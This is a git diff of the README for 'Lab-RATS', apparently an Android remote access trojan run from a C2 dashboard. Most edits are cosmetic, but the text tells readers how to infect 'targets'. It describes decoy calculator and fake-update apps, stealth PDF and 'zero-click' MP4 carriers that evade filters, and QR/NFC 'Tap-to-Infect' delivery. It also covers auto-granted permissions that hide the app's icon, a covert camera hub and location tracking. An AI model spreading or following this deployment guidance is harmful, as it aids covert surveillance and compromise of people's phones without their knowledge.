@@ -81,7 +81,7 @@ alt="Typing Banner"
 - 🧮 **Calculator**: **Performs actual math** with a **tactical logic engine**.
 - 🌦️ **Weather App**: Displays **real-time localized forecasts** via **Open-Meteo API**.
 - 🛡️ **Software Update**: **Simulates a legitimate system update screen** to **build target trust**.
-- 🐭 **Lab-Rats & System Stability Services**: **Completely unmasked** and **directly opens** the C2 server interface on device.
+- 🐭 **Lab-Rats & System Stability Services**: **Completely unmasked** and **directly opens** the **C2 server interface on device**.
 
 ### ☎️ Emergency Recovery & Self Healing:
 - **Dialer Unlock**: Type `*#1337#` on the **phone's keypad** to **unmask the Lab-RATS server interface back into view**.
@@ -275,7 +275,7 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
   <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner"/>
 </p>
 
-To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure **your environment meets the following requirements**:
+To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure **your Environment meets the following requirements**:
 
 ### 1. Workstation & Build Requirements: *(To Build APKs)*
 * **Java Development Kit (JDK)**: **JDK 17 or JDK 21** *(JDK 21 recommended)*.
@@ -333,7 +333,6 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 **Standard** `.apk` files are **often blocked by email filters and browser security**. Use the **Infection Chain Wizard** *(Option 6)* in the `apk-builder` tool to **wrap your link inside a high-compatibility carrier file**:
 *   **📑 Stealth PDF**: Send to **targets via Email or Drive**. It utilizes **URI Actions** instead of **JavaScript** to trigger an **automatic browser-based download, bypassing standard PDF security filters**.
 *   **🎬 Zero-Click MP4**: **Send as a video file**. It **exploits** mobile **Media Heap Overflows** during **gallery indexing or thumbnail generation** to **force-register the C2 link in the background**.
-*   **🗓️ Meeting Invite (ICS)**: Injects a **persistent event** into the **target's Calendar with automated reminders** and a **weaponized "Security Review" link**.
 *   **🔳 QR Code / 📡 NFC**: **Best for physical placement** or **"Tap-to-Infect" proximity delivery**. Generates a **high-density QR** or **NDEF record** pointing to the **hardened delivery URL**.
 *   **And Many More**: The **Wizard** also supports **ADB Strategic Bridge, Stego Image Tails, PWA Manifests**, and **Office Document macros**.
 
@@ -345,7 +344,7 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 Once the **target device** downloads the **APK**:
 1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed.apk`
 2.  **NEW! 'One-Click' Permission Granting (CRITICAL)**: **Open the app ONCE**. **Only the initial Pop-up *(Accessibility Services)* must be manually toggled on**, **ALL other permissions are now auto-granted by the system** using a **convincing security sequence**.
--  -  **Remote Permission Prompt**: If a **user removes any permissions**, you can **remotely trigger the system prompts again** using the **repair buttons** in the **GHOST UTILITIES** section.
+-  -  **Remote Permission Prompt**: If a **User removes any permissions**, you can **remotely trigger the system prompts again** using the **repair buttons** in the **GHOST UTILITIES** section.
 3.  **Self-Vanishing**: A **few seconds after launch**, the app will **automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
 4.  **Uplink Confirmation**: Check your **Google Sheet or Render  C2. Within 5 seconds of initialization**, the **Device ID, Connection Type, IP, Port, C2 Dashboard Link, Battery % and more will appear in the log**.
 
@@ -355,13 +354,13 @@ Once the **target device** downloads the **APK**:
   <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"/>
 </p>
 
-**If** you find **Lab-RATS awesome** and **useful for your security research**, **Please Star ⭐ the project**—it **drives further development!**
+**If** you find **Lab-RATS Awesome** and **Useful for your Testing & Security Research**, **Please Star ⭐ the project**—it **drives further development!**
 
 <p align="left">
   <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=22&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"/>
 </p>
 
-**Bug Reports, Add New Feature** and **Pull Requests** are **Always Welcome!**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**.)*
+**Bug Reports, Add New Feature** and **Pull Requests** are **Always Welcome!** *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**)*.
 
 ---
 
@@ -372,7 +371,7 @@ Once the **target device** downloads the **APK**:
 
 [<img src="https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black">](https://buymeacoffee.com/k4n3co)
 
-<img src="https://img.shields.io/badge/Donate-Bitcoin-F7931A?style=for-the-badge&logo=bitcoin&logoColor=black">
+<img src="https://img.shields.io/badge/Donate-Bitcoin-F7931A?style=for-the-badge&logo=bitcoin&logoColor=white">
 
 ```
 bc1q8d66m0qthnh6nw9hc5wl09m7pfydk46q5w8rxx
@@ -385,7 +384,7 @@ bc1q8d66m0qthnh6nw9hc5wl09m7pfydk46q5w8rxx
  />
 </p>
 
-### Git Clone & APK-Builder Example *(Mac OS)*:
+### Git Clone & APK-Builder Example *(MacBook-Air M2)*:
 
 https://github.com/user-attachments/assets/ff955171-67bd-4450-a6ce-4375207e5ae4
 
@@ -397,19 +396,19 @@ https://github.com/user-attachments/assets/cab0c7ee-52bb-40a0-b7c6-46a0f8b38c5f
 
 ---
 
-### C2 Dashboard *(PC Interface)* - Remote Shell & Decoys:
+### Remote C2 Dashboard - Remote Shell & Decoys:
 
 https://github.com/user-attachments/assets/37109047-b727-4914-b19f-42edcedd770a
 
 ---
 
-### C2 Dashboard - Ghost Ops & Locate:
+### Remote C2 Dashboard - Ghost Ops & Locate:
 
 https://github.com/user-attachments/assets/806b7132-370b-49d8-b6b5-3823d0ebe0f0
 
 ---
 
-### C2 Dashboard - Covert Camera Hub:
+### Remote C2 Dashboard - Covert Camera Hub:
 
 https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 
@@ -435,7 +434,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/920be29b-88bd-4516-82ff-1deb28cce098" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/7f4e02c5-4984-48e5-a76c-6c4ba530495c" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -445,7 +444,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/d549b1ad-8390-47bf-be1c-2fa6b185bcbe" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/3eb33ae7-aebd-4464-8547-979bb296eb27" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -455,7 +454,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/020eff59-9444-4dcd-b987-6c0fbcb6249e" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/bea953b9-753e-412d-b10e-12ded5055d82" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -465,7 +464,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/cae2c596-8551-4dbf-80a3-6a9b4cfec58d" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/3425ccc3-db7b-43ab-b3b9-8cb3c555469b" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -475,7 +474,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/9adc2ea3-9705-4f61-9d47-329f4d17b373" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/2aaa4c63-1ee8-4589-a78c-c2fc6e4deadf" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -485,7 +484,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/55726a19-c071-405c-afef-ab50f119f3e0" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/835edd2f-35b4-4b7d-b527-c36ffa18990f" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -495,7 +494,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/35c0ff19-fec5-4734-a103-99f260ea7419" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/5ff097a0-4460-4a54-a149-253b628f7f01" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -505,7 +504,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/bafdc486-fc2b-4399-99c9-2e6e444d8a18" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/54acccb7-b412-4a57-9c15-ca36ce58050d" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -515,7 +514,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/2559606d-6025-416c-99b1-8a78e046d31b" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/5340b242-bec6-440f-80ae-b1850d6eb163" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -525,7 +524,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/8b1efce6-1d3b-490c-8d73-9dbde39c2a53" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/4ec71933-6264-4d75-90db-aebfdf40e636" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -535,7 +534,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/53d82189-6cb9-4489-835b-b929624181de" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/ae00ca08-43e0-42c8-8bfa-fde16523d096" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -545,7 +544,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/9c7336a1-9770-4881-bfcc-3de331812789" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/1da37dba-a84a-4e0f-8453-d763e73bade0" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -555,7 +554,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 <details>
   <summary>📸 Click to View Dashboard Screenshot</summary>
   <br>
-  <img src="https://github.com/user-attachments/assets/d918e6bf-7b92-42ad-bf17-c38ef1c32615" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/f1874c3d-0866-4c1f-9f94-f5ca2c1aed6e" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 ---
@@ -583,7 +582,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
 </div>
 
 <p align="center">
-<img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind-cyan?style=for-the-badge&logo=maserati&logoColor=white">
+<img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind...-cyan?style=for-the-badge&logo=maserati&logoColor=black">
 <br>
 <p align="center">
-<img src="https://img.shields.io/badge/Developed By-KAN3C0 ©2026-darkred?style=for-the-badge&logo=magisk&logoColor=white">
+<img src="https://img.shields.io/badge/©2026-K4N3CO.LABS-darkgreen?style=for-the-badge&logo=magisk&logoColor=white">
